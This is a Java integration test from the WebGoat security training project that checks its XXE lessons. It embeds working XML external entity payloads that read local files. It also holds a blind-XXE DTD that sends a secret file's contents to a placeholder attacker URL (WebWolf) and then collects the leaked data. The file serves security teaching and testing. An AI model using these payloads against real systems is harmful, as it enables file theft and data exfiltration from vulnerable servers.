/*
 * SPDX-FileCopyrightText: Copyright © 2019 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.integration;

import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import java.io.IOException;
import org.junit.jupiter.api.Test;

public class XXEIntegrationTest extends IntegrationTest {

  private static final String xxe3 =
      """
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;test</text></comment>
""";
  private static final String xxe4 =
      """
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;test</text></comment>
""";
  private static final String dtd7 =
      """
<?xml version="1.0" encoding="UTF-8"?><!ENTITY % file SYSTEM "file:SECRET"><!ENTITY % all "<!ENTITY send SYSTEM 'WEBWOLFURL?text=%file;'>">%all;
""";
  private static final String xxe7 =
      """
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE comment [<!ENTITY % remote SYSTEM "WEBWOLFURL/USERNAME/blind.dtd">%remote;]><comment><text>test&send;</text></comment>
""";

  private String webGoatHomeDirectory;

  // TODO fix me
  //  /*
  //   * This test is to verify that all is secure when XXE security patch is applied.
  //   */
  //  @Test
  //  public void xxeSecure() throws IOException {
  //    startLesson("XXE");
  //    webGoatHomeDirectory = webGoatServerDirectory();
  //    RestAssured.given()
  //        .when()
  //        .relaxedHTTPSValidation()
  //        .cookie("JSESSIONID", getWebGoatCookie())
  //        .get(url("service/enable-security.mvc"))
  //        .then()
  //        .statusCode(200);
  //    checkAssignment(url("xxe/simple"), ContentType.XML, xxe3, false);
  //    checkAssignment(url("xxe/content-type"), ContentType.XML, xxe4, false);
  //    checkAssignment(
  //        url("xxe/blind"),
  //        ContentType.XML,
  //        "<comment><text>" + getSecret() + "</text></comment>",
  //        false);
  //  }

  /**
   * This performs the steps of the exercise before the secret can be committed in the final step.
   *
   * @return
   */
  private String getSecret() {
    String secretFile = webGoatHomeDirectory.concat("/XXE/" + getUser() + "/secret.txt");
    String webWolfCallback = webWolfUrlConfig.url("landing");
    String dtd7String = dtd7.replace("WEBWOLFURL", webWolfCallback).replace("SECRET", secretFile);

    // upload DTD
    RestAssured.given()
        .when()
        .relaxedHTTPSValidation()
        .cookie("WEBWOLFSESSION", getWebWolfCookie())
        .multiPart("file", "blind.dtd", dtd7String.getBytes())
        .post(webWolfUrlConfig.url("fileupload"))
        .then()
        .extract()
        .response()
        .getBody()
        .asString();

    // upload attack
    String xxe7String =
        xxe7.replace("WEBWOLFURL", webWolfUrlConfig.url("files"))
            .replace("USERNAME", this.getUser());
      checkAssignment(webGoatUrlConfig.url("xxe/blind"), ContentType.XML, xxe7String, false);

    // read results from WebWolf
    String result =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("WEBWOLFSESSION", getWebWolfCookie())
            .get(webWolfUrlConfig.url("requests"))
            .then()
            .extract()
            .response()
            .getBody()
            .asString();
    result = result.replace("%20", " ");
    if (-1 != result.lastIndexOf("WebGoat 8.0 rocks... (")) {
      result =
          result.substring(
              result.lastIndexOf("WebGoat 8.0 rocks... ("),
              result.lastIndexOf("WebGoat 8.0 rocks... (") + 33);
    }
    return result;
  }

  @Test
  public void runTests() throws IOException {
    startLesson("XXE", true);
    webGoatHomeDirectory = webGoatServerDirectory();
      checkAssignment(webGoatUrlConfig.url("xxe/simple"), ContentType.XML, xxe3, true);
      checkAssignment(webGoatUrlConfig.url("xxe/content-type"), ContentType.XML, xxe4, true);
      checkAssignment(
              webGoatUrlConfig.url("xxe/blind"),
        ContentType.XML,
        "<comment><text>" + getSecret() + "</text></comment>",
        true);
    checkResults("XXE");
  }
}
